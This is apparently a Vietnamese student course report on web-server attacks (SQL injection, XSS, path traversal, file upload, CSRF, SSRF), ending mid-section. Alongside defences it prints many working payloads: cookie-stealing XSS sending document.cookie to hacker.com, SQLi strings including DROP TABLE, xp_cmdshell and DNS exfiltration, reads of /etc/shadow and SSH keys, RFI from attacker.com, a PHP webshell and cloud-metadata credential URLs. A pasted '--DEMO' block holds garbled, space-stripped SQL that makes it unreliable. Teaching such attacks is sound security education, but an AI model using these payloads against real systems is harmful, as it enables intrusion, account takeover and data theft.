# CÁC KỸ THUẬT TẤN CÔNG WEBSERVER

**Tác giả:** Huynh Quoc Huy
**Môn học:** System Safety & Network Security (An Toàn Hệ Thống Và An Ninh Mạng )
**Ngày:** Tháng 8, 2025

---

## 1. GIỚI THIỆU TỔNG QUAN

### 1.1. Các khái niệm cơ bản về an toàn thông tin

![Hình 1: Ảnh minh họa về an toàn thông tin](placeholder-security-image.png)

#### 1.1.1. Tam giác bảo mật CIA (Confidentiality, Integrity, Availability)

Mô hình tam giác CIA là mô hình cốt lõi và nền tảng của an toàn thông tin, được công nhận rộng rãi trong cộng đồng bảo mật toàn cầu `<citation>`1,8 `</citation>`. Nó định nghĩa ba mục tiêu chính mà mọi chiến lược bảo mật cần hướng tới để bảo vệ thông tin và hệ thống một cách toàn diện `<citation>`2 `</citation>`:

**Confidentiality (Tính bảo mật):** Mục tiêu này đảm bảo rằng thông tin được bảo vệ khỏi sự truy cập, sử dụng, hoặc thay đổi không được phép. Một cuộc tấn công SQL Injection thành công, nơi tin tặc có thể lấy được dữ liệu người dùng như email và mật khẩu, là một ví dụ điển hình về việc vi phạm tính bảo mật này `<citation>`3,4 `</citation>`.

**Integrity (Tính toàn vẹn):** Tính toàn vẹn của dữ liệu đề cập đến việc đảm bảo tính chính xác và đầy đủ của thông tin, ngăn chặn việc sửa đổi hoặc phá hủy trái phép. Khi một kẻ tấn công SQL Injection có thể sửa, xóa hoặc thay đổi toàn bộ dữ liệu trong cơ sở dữ liệu, tính toàn vẹn của hệ thống đã bị phá vỡ hoàn toàn `<citation>`5,6 `</citation>`.

**Availability (Tính sẵn sàng):** Mục tiêu cuối cùng của tính sẵn sàng là đảm bảo rằng các hệ thống, ứng dụng và dữ liệu luôn có thể truy cập được cho người dùng được ủy quyền vào bất cứ lúc nào họ cần. Các cuộc tấn công từ chối dịch vụ (DoS) và từ chối dịch vụ phân tán (DDoS) trực tiếp nhắm vào mục tiêu này. Bằng cách làm quá tải hệ thống với một lượng lớn lưu lượng truy cập, chúng khiến dịch vụ không thể phản hồi và gây gián đoạn nghiêm trọng cho người dùng hợp pháp `<citation>`7,48 `</citation>`.

**Bốn tính chất bổ sung trong khái niệm an toàn thông tin hiện đại:**

- **Authenticity (Tính xác thực):** Đảm bảo rằng các tổ chức hoặc cá nhân truy cập thông tin có quyền truy cập hợp pháp
- **Reliability (Tính đáng tin cậy):** Đảm bảo dữ liệu và hệ thống hoạt động mà không có lỗi do con người hoặc lỗi phần mềm
- **Accountability (Tính trách nhiệm):** Theo dõi hoạt động của các công ty hoặc cá nhân để xác định nguyên nhân và hành vi của người dùng
- **Non-repudiation (Tính không thể chối bỏ):** Chứng minh rằng thông tin không thể bị phủ nhận sau này, thường thông qua việc ghi log hệ thống `<citation>`8 `</citation>`

#### 1.1.2. Phân loại đối tượng tấn công

Các chuyên gia an ninh mạng thường phân loại hacker dựa trên động cơ và hành vi của họ. Sự phân loại này không chỉ là một định nghĩa đơn thuần mà còn phản ánh sự đa dạng của động cơ tấn công, từ đó giúp xây dựng các chiến lược phòng thủ phù hợp hơn `<citation>`9 `</citation>`:

**Hacker Mũ Trắng (White Hat):** Đây là những hacker "có đạo đức," sử dụng kiến thức và kỹ năng của họ để tìm kiếm lỗ hổng và bảo vệ hệ thống. Họ thường được các tổ chức, doanh nghiệp thuê để thực hiện kiểm thử xâm nhập (penetration testing) hoặc tham gia các chương trình tìm lỗi để vá lỗi trước khi bị kẻ xấu lợi dụng. White hat hacker thường là những người có năng lực chuyên môn cao trong lĩnh vực khoa học máy tính, công nghệ thông tin, an ninh mạng `<citation>`9 `</citation>`.

**Hacker Mũ Đen (Black Hat):** Đây là những kẻ tấn công có mục đích xấu. Họ xâm nhập, đánh cắp thông tin, và gây thiệt hại cho hệ thống để trục lợi cá nhân, tống tiền hoặc vì các động cơ chính trị. Trái ngược với hacker mũ trắng, những hacker mũ đen truy cập trái phép vào hệ thống để "bẻ khóa" (crack) những ứng dụng được bảo vệ, nhằm sử dụng tài nguyên một cách miễn phí `<citation>`9 `</citation>`.

**Hacker Mũ Xám (Gray Hat):** Nhóm này hoạt động ở ranh giới giữa hai loại trên. Họ có thể xâm nhập hệ thống mà không được phép, nhưng không nhằm mục đích phá hoại. Họ có thể thông báo lỗ hổng cho chủ sở hữu hệ thống và đôi khi đòi hỏi một khoản phí để đổi lấy thông tin đó `<citation>`9 `</citation>`.

**Hacker Mũ Xanh (Blue Hat):** Hacker mũ xanh dương là vị trí có vai trò bảo vệ cho chính ứng dụng hay hệ thống mạng mà họ xâm nhập vào. Công việc của một blue hat hacker được gọi là pentest (Penetration Testing) tức kiểm thử xâm nhập. Hacker mũ xanh dương thực chất chính là những chuyên gia bảo mật và an ninh mạng `<citation>`9 `</citation>`.

Sự tồn tại của hacker mũ trắng và các chuẩn mực như OWASP Top 10 đã tạo ra một "hệ sinh thái" an ninh mạng, nơi mà các tổ chức có thể chủ động tìm và vá lỗi trước khi bị tấn công bởi hacker mũ đen, chuyển từ tư duy phòng thủ bị động sang phòng thủ chủ động `<citation>`10 `</citation>`.

### 1.2. Vòng đời tấn công mạng (Cyber Kill Chain)

Mô hình Cyber Kill Chain mô tả con đường mà kẻ tấn công đi qua một cách rất hệ thống để thực hiện một cuộc tấn công vào mục tiêu. Được phát triển bởi Lockheed Martin, mô hình này không chỉ giúp mô tả một cuộc tấn công đã xảy ra mà còn cung cấp một bản mẫu để xây dựng chiến lược phòng thủ nhiều lớp `<citation>`11,12 `</citation>`.

**Mô hình Cyber Kill Chain gồm 7 giai đoạn cốt lõi:**

1. **Reconnaissance (Trinh sát):** Kẻ tấn công thu thập thông tin về mục tiêu, tìm kiếm các lỗ hổng và điểm yếu. Các phương pháp bao gồm quét hệ thống để tìm lỗ hổng bảo mật hoặc thu thập thông tin công khai về tổ chức mục tiêu `<citation>`12,15 `</citation>`.
2. **Weaponization (Vũ khí hóa):** Kẻ tấn công tạo ra các công cụ tấn công tùy chỉnh, thường kết hợp malware với exploit để tạo ra payload hiệu quả `<citation>`12 `</citation>`.
3. **Delivery (Phân phối):** Giai đoạn truyền tải vũ khí tấn công đến nạn nhân, thường thông qua email lừa đảo (phishing), các trang web bị xâm nhập, hoặc USB độc hại `<citation>`15 `</citation>`.
4. **Exploitation (Khai thác):** Kẻ tấn công khai thác các lỗ hổng để giành quyền kiểm soát hệ thống, thường bằng cách cài đặt các đoạn mã độc hại `<citation>`12 `</citation>`.
5. **Installation (Cài đặt):** Sau khi xâm nhập thành công, kẻ tấn công cài đặt malware hoặc backdoor để duy trì quyền truy cập `<citation>`15 `</citation>`.
6. **Command and Control (Chỉ huy và Điều khiển):** Thiết lập kênh liên lạc với máy chủ điều khiển từ xa để nhận lệnh và gửi dữ liệu đánh cắp được `<citation>`18 `</citation>`.
7. **Actions on Objectives (Hành động trên mục tiêu):** Thực hiện mục tiêu cuối cùng như đánh cắp dữ liệu, phá hủy hệ thống, hoặc mã hóa dữ liệu để tống tiền `<citation>`12 `</citation>`.

Bằng cách hiểu từng giai đoạn của cuộc tấn công, các tổ chức có thể đặt ra các lớp phòng thủ tại mỗi "mắt xích." Ví dụ, sử dụng Tường lửa Ứng dụng Web (WAF) để ngăn chặn giai đoạn khai thác, hoặc hệ thống IDS/IPS để phát hiện và ngăn chặn ở giai đoạn reconnaissance `<citation>`19 `</citation>`.

### 1.3. Tổng quan về các lỗ hổng bảo mật Web phổ biến

#### 1.3.1. Giới thiệu về OWASP Top 10

OWASP (Open Web Application Security Project) là một tổ chức phi lợi nhuận nổi tiếng, chuyên cung cấp danh sách 10 rủi ro bảo mật nghiêm trọng nhất đối với các ứng dụng web. Danh sách này là một tài liệu nhận thức tiêu chuẩn cho các nhà phát triển và được công nhận rộng rãi như bước đầu tiên để viết mã an toàn hơn `<citation>`1,20 `</citation>`.

#### 1.3.2. Phân tích các lỗ hổng chính trong OWASP Top 10:2021 và cập nhật 2025

Phân tích phiên bản OWASP Top 10:2021 cho thấy sự thay đổi đáng kể trong bức tranh an ninh mạng. Năm 2025, các chuyên gia bảo mật tiếp tục quan sát sự phát triển của các mối đe dọa mới và biến thể của các cuộc tấn công truyền thống `<citation>`4,22 `</citation>`:

**A01:2021-Broken Access Control (Kiểm soát truy cập bị hỏng):** Lỗ hổng này đã tăng từ vị trí thứ năm lên vị trí đầu tiên, cho thấy 94% các ứng dụng được kiểm tra có vấn đề về kiểm soát truy cập. Đây là mối quan tâm hàng đầu trong năm 2025 `<citation>`1,4 `</citation>`.

**A02:2021-Cryptographic Failures (Lỗi mã hóa):** Lỗ hổng này được đổi tên từ "Sensitive Data Exposure" để tập trung vào nguyên nhân gốc rễ là các lỗi trong mã hóa, thường dẫn đến việc lộ dữ liệu nhạy cảm `<citation>`1 `</citation>`.

**A03:2021-Injection (Lỗi chèn):** Mặc dù giảm xuống vị trí thứ ba, đây vẫn là một mối đe dọa lớn. Lỗi chèn mã độc (như SQL Injection và XSS) vẫn là một trong những lỗ hổng phổ biến nhất và nghiêm trọng nhất. Năm 2025, các chuyên gia quan sát thấy sự gia tăng của các vector injection mới bao gồm NoSQL databases, AI model prompts, và containerized environments `<citation>`31 `</citation>`.

**A04:2021-Insecure Design (Thiết kế không an toàn):** Đây là một danh mục hoàn toàn mới, nhấn mạnh tầm quan trọng của việc thiết kế an toàn ngay từ giai đoạn đầu của dự án `<citation>`1 `</citation>`.

**A05:2021-Security Misconfiguration (Cấu hình bảo mật sai):** Lỗ hổng này tiếp tục là mối quan tâm lớn, đặc biệt trong bối cảnh cloud computing phát triển mạnh `<citation>`7 `</citation>`.

**A06:2021-Vulnerable and Outdated Components (Các thành phần dễ bị tổn thương và lỗi thời):** Lỗ hổng này tăng từ vị trí thứ 9 lên vị trí thứ 6, cho thấy sự phụ thuộc vào các thư viện bên thứ ba có thể là một điểm yếu nghiêm trọng nếu chúng không được cập nhật thường xuyên `<citation>`1 `</citation>`.

**A09:2021-Security Logging and Monitoring Failures (Lỗi ghi nhật ký và giám sát bảo mật):** Lỗi này ảnh hưởng trực tiếp đến khả năng hiển thị và điều tra sự cố. Khi thiếu cơ chế ghi nhật ký và giám sát, việc phát hiện và phản ứng với các cuộc tấn công trở nên cực kỳ khó khăn `<citation>`1 `</citation>`.

---

## 2. CÁC KỸ THUẬT TẤN CÔNG WEB SERVER

### 2.1. Tấn công SQL Injection (SQLi)

#### 2.1.1. Giới thiệu về SQL Injection

Đa số các ứng dụng web ngày nay đều sử dụng Ngôn ngữ Truy vấn Cấu trúc (SQL) để quản lý và truy xuất dữ liệu từ các hệ quản trị cơ sở dữ liệu như Oracle, MS SQL hay MySQL. Chính vì vậy, các lỗ hổng liên quan đến SQL thường được xếp vào nhóm nguy hiểm nhất, và một trong những dạng tấn công phổ biến nhất là SQL Injection `<citation>`33 `</citation>`.

SQL Injection là một kỹ thuật tấn công cho phép kẻ tấn công lợi dụng những lỗ hổng trong quá trình kiểm tra và lọc dữ liệu đầu vào của các ứng dụng web. Bằng cách "tiêm" (inject) các câu lệnh SQL bất hợp pháp thông qua các form nhập liệu, kẻ tấn công có thể thực thi các truy vấn không mong muốn trên cơ sở dữ liệu, thậm chí trên cả máy chủ đang chạy ứng dụng đó `<citation>`33,36 `</citation>`.

Tấn công SQL Injection có thể gây ra những hậu quả nghiêm trọng, từ việc đánh cắp thông tin nhạy cảm của người dùng (như tài khoản, mật khẩu, thông tin thẻ tín dụng) cho đến việc xóa, thay đổi hoặc chèn dữ liệu. Năm 2025, SQL injection vẫn là một trong những mối đe dọa hàng đầu, với các biến thể mới nhắm vào các cơ sở dữ liệu NoSQL và môi trường containerized `<citation>`31,37 `</citation>`.

#### 2.1.2. Các loại lỗi thường gặp dẫn đến SQL Injection

Lỗi SQL Injection thường phát sinh từ sự thiếu sót trong việc xử lý dữ liệu đầu vào của lập trình viên. Có ba dạng lỗi chính:

**a) Không kiểm tra ký tự thoát truy vấn (Escaping Characters)**

Đây là dạng lỗi cơ bản nhất, xảy ra khi mã nguồn không kiểm tra chặt chẽ các ký tự đặc biệt như dấu nháy đơn (') trong các câu truy vấn.

Ví dụ minh họa:

```sql
statement = "SELECT * FROM users WHERE name = '" + userName + "';"
```

Nếu kẻ tấn công nhập `a' or 'true'='true`, câu truy vấn sẽ trở thành:

```sql
SELECT * FROM users WHERE name = 'a' OR 'true'='true';
```

**b) Xử lý không đúng kiểu dữ liệu (Incorrect Data Type Handling)**

Lỗi này xảy ra khi lập trình viên mong đợi một kiểu dữ liệu cụ thể nhưng không kiểm tra tính hợp lệ của dữ liệu đầu vào.

Ví dụ:

```sql
statement := "SELECT * FROM data WHERE id = " + a_variable + ";"
```

Nếu kẻ tấn công nhập `1;DROP TABLE users`, câu truy vấn sẽ thực thi cả lệnh xóa bảng.

#### 2.1.3. Các dạng tấn công SQL Injection

**Dạng 1: In-band SQL Injection (Tấn công trong băng tần)**

Đây là loại tấn công phổ biến nhất, trong đó kẻ tấn công sử dụng cùng một kênh giao tiếp để thực hiện tấn công và nhận kết quả truy vấn.

*Union-based SQL Injection:*

```sql
1' UNION SELECT username, password FROM users--
```

*Error-based SQL Injection:*

```sql
1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**Dạng 2: Blind SQL Injection (Tấn công mù)**

Kẻ tấn công không nhận được kết quả trực tiếp mà phải suy luận thông qua các dấu hiệu gián tiếp.

*Boolean-based Blind SQLi:*

```sql
1' AND (SELECT SUBSTRING(@@version,1,1))='5'--
```

*Time-based Blind SQLi:*

```sql
1' AND IF((SELECT SUBSTRING(@@version,1,1))='5',SLEEP(5),NULL)--
```

**Dạng 3: Out-of-Band SQL Injection**

Kẻ tấn công buộc cơ sở dữ liệu gửi dữ liệu qua kênh ngoại vi như DNS hoặc HTTP.

#### 2.1.4. Tác động của các cuộc tấn công SQL Injection

Các cuộc tấn công SQL Injection thành công có thể gây ra những hậu quả nghiêm trọng:

- **Truy cập trái phép dữ liệu:** Tội phạm mạng có thể truy cập thông tin nhạy cảm như PII, số thẻ tín dụng `<citation>`14 `</citation>`
- **Thay đổi hoặc xóa dữ liệu:** Có thể dẫn đến mất dữ liệu đáng kể hoặc khiến hệ thống không hoạt động
- **Chiếm quyền điều khiển hệ thống:** Trong một số trường hợp, có thể dẫn đến Remote Code Execution

**Case studies nổi tiếng:**

- **Equifax (2017):** 143 triệu hồ sơ cá nhân bị xâm phạm thông qua lỗ hổng SQL injection
- **Sony PlayStation Network (2011):** 77 triệu tài khoản người dùng bị ảnh hưởng

### 2.1.5. Biện pháp phòng chống SQL Injection

**a) Prepared Statements (Câu lệnh chuẩn bị)**

Đây là phương pháp hiệu quả nhất để ngăn chặn SQL Injection:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**b) Input Validation & Sanitization**

- Sử dụng whitelist cho các ký tự được chấp nhận
- Kiểm tra độ dài và định dạng dữ liệu đầu vào
- Sử dụng các thư viện sanitization chuyên dụng

**c) Nguyên tắc đặc quyền tối thiểu**

- Tài khoản kết nối database chỉ có quyền tối thiểu cần thiết
- Tránh sử dụng tài khoản có quyền admin

**d) Các biện pháp bổ sung**

- Hạn chế thông báo lỗi chi tiết
- Sử dụng WAF (Web Application Firewall)
- Cập nhật và vá lỗi thường xuyên
- Triển khai monitoring và logging

### 2.2. Tấn công Cross-Site Scripting (XSS)

#### 2.2.1. Giới thiệu về Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) là một trong những lỗ hổng bảo mật ứng dụng web phổ biến nhất, cho phép kẻ tấn công chèn các đoạn mã độc hại (thường là JavaScript, nhưng cũng có thể là HTML hoặc các ngôn ngữ kịch bản khác) vào các trang web hợp pháp. Khi người dùng truy cập vào trang web bị lỗi, đoạn mã này sẽ được thực thi trên trình duyệt của họ `<citation>`34,49 `</citation>`.

Mục tiêu của cuộc tấn công XSS không phải là máy chủ web mà là người dùng cuối, nhằm đánh cắp thông tin nhạy cảm của họ hoặc thực hiện các hành động độc hại. XSS thường phát sinh từ việc ứng dụng web tin tưởng vào dữ liệu đầu vào của người dùng mà không có biện pháp kiểm tra lọc cẩn thận `<citation>`38 `</citation>`.

Năm 2025, XSS vẫn tiếp tục là một mối đe dọa nghiêm trọng, đặc biệt với sự phát triển của các ứng dụng web động và Single Page Applications (SPAs) `<citation>`49 `</citation>`.

#### 2.2.2. Các dạng tấn công XSS và đặc điểm

**a) Reflected XSS (XSS Phản Chiếu)**

Đây là dạng tấn công phổ biến nhất. Mã độc được gửi đến nạn nhân thông qua một URL có chứa payload và được máy chủ phản hồi trở lại trình duyệt ngay lập tức.

Ví dụ payload:

```html
https://victimsite.com/search?q=<script>alert('XSS_Reflected!');</script>
```

Cơ chế khai thác session hijacking:

```javascript
var i=new Image; i.src="http://hacker-site.net/"+document.cookie;
```

**b) Stored XSS (XSS được lưu trữ)**

Đây là dạng nguy hiểm nhất vì mã độc được lưu trữ vĩnh viễn trên máy chủ. Mọi người dùng truy cập vào trang chứa nội dung đó đều sẽ bị ảnh hưởng.

Ví dụ payload trong form bình luận:

```html
<script>new Image().src="https://hacker.com/steal.php?cookie="+document.cookie;</script>
```

**c) DOM-based XSS (XSS Dựa Trên DOM)**

Dạng tấn công này xảy ra hoàn toàn ở phía client, lợi dụng các lỗ hổng trong mã JavaScript để thay đổi DOM của trình duyệr.

Ví dụ payload:

```html
https://victimsite.com/page#name=<img src=x onerror=alert('DOM_XSS')>
```

#### 2.2.3. Tác hại của cuộc tấn công XSS

Khi một cuộc tấn công XSS thành công, kẻ tấn công có thể:

- **Session Hijacking:** Đánh cắp cookie phiên để chiếm quyền điều khiển tài khoản
- **Phishing:** Chuyển hướng người dùng đến các trang giả mạo
- **Keylogging:** Theo dõi thao tác gõ phím để đánh cắp mật khẩu
- **Thực thi hành động độc hại:** Buộc người dùng thực hiện các hành động không mong muốn
- **Malware Distribution:** Chèn mã độc để cài đặt phần mềm độc hại

#### 2.2.4. Biện pháp phòng chống XSS

**a) Output Encoding (Mã hóa đầu ra)**

Đây là biện pháp phòng thủ hiệu quả nhất:

```html
< thành <
> thành >
" thành "
' thành '
```

**b) Input Validation & Sanitization**

- Kiểm tra nghiêm ngặt dữ liệu đầu vào
- Sử dụng whitelist cho các ký tự được phép
- Loại bỏ hoặc escape các thẻ HTML/JavaScript nguy hiểm

**c) Content Security Policy (CSP)**

CSP là một lớp bảo mật mạnh mẽ, chỉ định các nguồn nội dung được phép:

```html
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

**d) Các biện pháp bổ sung**

- Sử dụng HTTP-only cookies
- Triển khai Same-site cookies
- Regular security scanning
- Framework bảo mật tích hợp sẵn

### 2.3. Tấn công Directory Traversal và Path Traversal

#### 2.3.1. Giới thiệu về Directory Traversal

Directory Traversal (còn gọi là Path Traversal) là một lỗ hổng bảo mật web cho phép kẻ tấn công truy cập vào các tệp và thư mục nằm ngoài thư mục gốc (web root) của máy chủ web. Cuộc tấn công này khai thác việc xác thực hoặc khử trùng dữ liệu đầu vào không đầy đủ của các tên tệp do người dùng cung cấp `<citation>`69,70 `</citation>`.

Lỗ hổng này có thể cho phép kẻ tấn công truy cập vào các tệp nhạy cảm như tệp cấu hình hệ thống, mật khẩu, hoặc thậm chí thực thi các lệnh trên máy chủ `<citation>`71,72 `</citation>`.

#### 2.3.2. Cơ chế hoạt động của Directory Traversal

Cuộc tấn công Directory Traversal thường sử dụng các chuỗi ký tự đặc biệt để "di chuyển" lên các thư mục cha:

**Các payload phổ biến:**

```
../../../etc/passwd          (Linux/Unix)
..\..\..\windows\system32\drivers\etc\hosts  (Windows)
....//....//....//etc/passwd  (Bypass filter)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  (URL encoded)
```

**Ví dụ thực tế:**
Giả sử một ứng dụng web có URL:

```
http://example.com/view.php?file=report.pdf
```

Kẻ tấn công có thể thử:

```
http://example.com/view.php?file=../../../etc/passwd
```

#### 2.3.3. Các kỹ thuật bypass phổ biến

**a) Encoding Techniques**

- URL encoding: `%2e%2e%2f` thay cho `../`
- Double encoding: `%252e%252e%252f`
- Unicode encoding: `%c0%ae%c0%ae%c0%af`

**b) Null Byte Injection**

```
../../../etc/passwd%00.jpg
```

**c) Filter Evasion**

```
....//....//etc/passwd
..../..../etc/passwd
```

#### 2.3.4. Tác động của Directory Traversal

- **Đọc tệp nhạy cảm:** Truy cập `/etc/passwd`, `/etc/shadow`, tệp cấu hình
- **Tiết lộ mã nguồn:** Đọc các tệp mã nguồn của ứng dụng
- **Thông tin hệ thống:** Thu thập thông tin về cấu trúc và cấu hình hệ thống
- **Remote Code Execution:** Trong một số trường hợp có thể dẫn đến RCE

#### 2.3.5. Biện pháp phòng chống

**a) Input Validation**

```php
// Chỉ cho phép ký tự alphanumeric và dấu chấm
if (!preg_match('/^[a-zA-Z0-9.]+$/', $filename)) {
    die('Invalid filename');
}
```

**b) Path Canonicalization**

```php
$realpath = realpath($basedir . '/' . $filename);
if (strpos($realpath, $basedir) !== 0) {
    die('Directory traversal detected');
}
```

**c) Chroot Jail**

- Giới hạn quyền truy cập tệp của ứng dụng
- Sử dụng container hoặc sandbox

**d) Whitelist approach**

- Chỉ cho phép truy cập vào một danh sách tệp được định trước
- Sử dụng file mapping thay vì truyền trực tiếp tên tệp

### 2.4. Lỗ hổng File Upload Vulnerability

--DEMO

statement ="SELECT * FROM users WHERE name = '"+ userName +"';"

--

'

a';DROPTABLEusers; SELECT *FROM data WHERE 't'='t

'

--

SELECT *FROM users WHEREname='a' OR 'true'='true';

--

SELECT *FROM users WHEREname='a';DROPTABLEusers; SELECT *FROMDATA WHERE 't'='t';

--

statement :="SELECT * FROM data WHERE id = "+ a_variable +";"

--

SELECT *FROMDATAWHEREid=1;DROPTABLEusers;

--

 UNIONSELECTALLSELECTOtherFieldFROMOtherTable WHERE ' '=' (*).

--

'DROPTABLE T_AUTHORS --.

--

INSERTINTOTableNameVALUES('Value One', 'Value Two', 'Value Three').

--

+ (SELECT TOP 1FieldNameFROM TableName) +

--

; EXEC xp_cmdshell 'cmd.exe dir C:

--

0'AND (SELECT 0FROM (SELECTcount(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*2)) AS x FROMinformation_schema.columnsGROUPBY x) y) --'

--

1'UNION SELECT 1,tablename FROMinformation_schema.tables –-

--

1' UNION SELECT 1,concat(user,':',password) FROM users --

--

'

1' UNION SELECT 1,2,3...n -- (n là số cột)

--

'

 1' and length(database())=4;--

--

'

1' and substring(database(),1,1)='d';--

--

'

1' AND sleep(10);--

--

'

1' and if((select+@@version) like "10%",sleep(2),null);--

--

1’;select load_file(concat('\\\\',version(),'.hacker.com\\s.txt'));

--

1; DROP TABLE users; --

SELECT * FROM data WHERE id=1; DROP TABLE users; --

<script>new Image().src="https://hacker.com/steal.php?cookie="+document.cookie;</script>

message=`<label>`Gender`</label>`

<select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select>

<script>function show(){alert();}</script>

--

# Linux/Unix systems

../../../etc/passwd

../../../../var/log/apache/access.log

../../../../../root/.ssh/id_rsa

php

// Vulnerable code

<?php

$file = $_GET['file'];

$filepath = "/var/www/files/" . $file;

readfile($filepath);

?>

URL tấn công:

http://vulnerable-site.com/download.php?file=../../../etc/passwd

Kết quả: Kẻ tấn công có thể đọc file /etc/passwd thay vì các file trong thư mục /var/www/files/.

java'

// Vulnerable Java code

StringfileName=request.getParameter("image");

Filefile=newFile("/webapp/images/"+ fileName);

// Process and display image

<?php

$page = $_GET['page'];

include($page . '.php');

?>

# BasicLFI

?page=../../../etc/passwd

# Nullbyte injection

?page=../../../etc/passwd%00

# PHP wrapper exploitation

?page=php://filter/convert.base64-encode/resource=config.php

?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Log poisoning

?page=../../../var/log/apache2/access.log

# BasicRFI

?page=http://attacker.com/shell.txt

# FTPRFI

?page=ftp://attacker.com/shell.txt

# DataURIRFI

?page=data://text/plain,`<?php system($_GET['cmd']); ?>`

# Zip wrapper

zip://shell.zip#shell.php

# Phar wrapper

phar://shell.phar/shell.php

#### 2.4.1. Giới thiệu về File Upload Vulnerability

File Upload Vulnerability là một lỗ hổng bảo mật nghiêm trọng xảy ra khi ứng dụng web cho phép người dùng tải lên các tệp mà không có kiểm tra bảo mật đầy đủ. Lỗ hổng này có thể dẫn đến việc thực thi mã từ xa (Remote Code Execution), ghi đè tệp hệ thống, hoặc tấn công từ chối dịch vụ.

#### 2.4.2. Các dạng tấn công File Upload

**a) Malicious File Upload**

Kẻ tấn công tải lên các tệp chứa mã độc hại:

```php
// webshell.php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**b) File Type Bypass**

Các kỹ thuật bypass filter:

- Double extension: `shell.php.jpg`
- Null byte injection: `shell.php%00.jpg`
- MIME type spoofing
- Case sensitivity bypass: `shell.PHP`

**c) Path Traversal trong File Upload**

```
filename: ../../var/www/html/shell.php
```

#### 2.4.3. Kỹ thuật khai thác nâng cao

**a) Polyglot Files**
Tạo tệp vừa là hình ảnh hợp lệ vừa chứa mã PHP:

```
GIF89a
<?php system($_GET['cmd']); ?>
```

**b) Archive Bomb (Zip Bomb)**
Tải lên tệp nén có kích thước nhỏ nhưng khi giải nén sẽ tiêu tốn tài nguyên hệ thống.

**c) XXE via File Upload**
Tải lên tệp XML hoặc SVG chứa XXE payload.

#### 2.4.4. Biện pháp phòng chống

**a) File Type Validation**

```php
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$file_info = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($file_info, $_FILES['upload']['tmp_name']);

if (!in_array($mime_type, $allowed_types)) {
    die('File type not allowed');
}
```

**b) File Size Limitation**

```php
if ($_FILES['upload']['size'] > 2097152) { // 2MB
    die('File too large');
}
```

**c) Secure File Storage**

- Store uploaded files outside web root
- Generate random filenames
- Use separate domain for file serving

**d) Content Scanning**

- Virus/malware scanning
- Static analysis for embedded scripts
- Image reprocessing để loại bỏ metadata

### 2.5. Tấn công Cross-Site Request Forgery (CSRF)

#### 2.5.1. Giới thiệu về CSRF

Cross-Site Request Forgery (CSRF) là một cuộc tấn công buộc người dùng đã xác thực thực hiện các hành động không mong muốn trên ứng dụng web. Kẻ tấn công lừa nạn nhân thực thi các yêu cầu mà kẻ tấn công tùy chọn thông qua session của nạn nhân `<citation>`49,55 `</citation>`.

#### 2.5.2. Cơ chế hoạt động của CSRF

**Kịch bản tấn công điển hình:**

1. Người dùng đăng nhập vào ngân hàng trực tuyến
2. Kẻ tấn công gửi email chứa liên kết độc hại
3. Khi người dùng click, trình duyệt tự động gửi request với session cookie
4. Ngân hàng thực hiện giao dịch vì request có vẻ hợp pháp

**Ví dụ CSRF attack:**

```html
<img src="http://bank.com/transfer?to=attacker&amount=1000" 
     style="display:none">
```

Hoặc sử dụng JavaScript:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://bank.com/transfer', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('to=attacker&amount=1000');
```

#### 2.5.3. Các dạng CSRF Attack

**a) GET-based CSRF**

```html
<img src="http://vulnerable-site.com/delete-account?confirm=yes">
```

**b) POST-based CSRF**

```html
<form action="http://vulnerable-site.com/change-password" method="POST" id="csrf-form">
    <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

**c) JSON CSRF**
Sử dụng Flash hoặc các kỹ thuật khác để gửi JSON requests.

#### 2.5.4. Biện pháp phòng chống CSRF

**a) CSRF Tokens**

```php
// Generate token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Verify token
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF token mismatch');
}
```

**b) SameSite Cookies**

```php
setcookie('session', $value, [
    'samesite' => 'Strict',
    'secure' => true,
    'httponly' => true
]);
```

**c) Double Submit Cookies**

```javascript
// Send CSRF token both in cookie and request body
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': getCookie('csrf_token')
    },
    body: formData
});
```

### 2.6. Server-Side Request Forgery (SSRF)

#### 2.6.1. Giới thiệu về SSRF

Server-Side Request Forgery (SSRF) là một lỗ hổng bảo mật cho phép kẻ tấn công lừa máy chủ thực hiện các yêu cầu HTTP đến một vị trí tùy ý mà kẻ tấn công lựa chọn. Năm 2025, SSRF tiếp tục là một mối đe dọa nghiêm trọng với hơn 400 IP đã được quan sát tấn công đồng thời nhiều lỗ hổng SSRF `<citation>`50,51,58 `</citation>`.

#### 2.6.2. Các dạng tấn công SSRF

**a) Basic SSRF**

```
http://vulnerable-app.com/fetch?url=http://internal-server:8080/admin
```

**b) Blind SSRF**
Kẻ tấn công không nhận được response trực tiếp:

```
http://vulnerable-app.com/webhook?url=http://attacker.com/callback
```

**c) SSRF với Protocol Bypass**

```
file:///etc/passwd
ftp://internal-ftp-server/
gopher://internal-service:1234/_payload
```

#### 2.6.3. Kỹ thuật khai thác SSRF

**a) Internal Network Reconnaissance**

```python
for i in range(1, 255):
    url = f"http://192.168.1.{i}:22"
    # Test connectivity to internal hosts
```

**b) Cloud Metadata Attack**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**c) Port Scanning**

```python
common_ports = [22, 80, 443, 3306, 5432, 6379, 27017]
for port in common_ports:
    test_url = f"http://internal-host:{port}"
```

#### 2.6.4. Bypass Techniques

**a) IP Address Obfuscation**

```
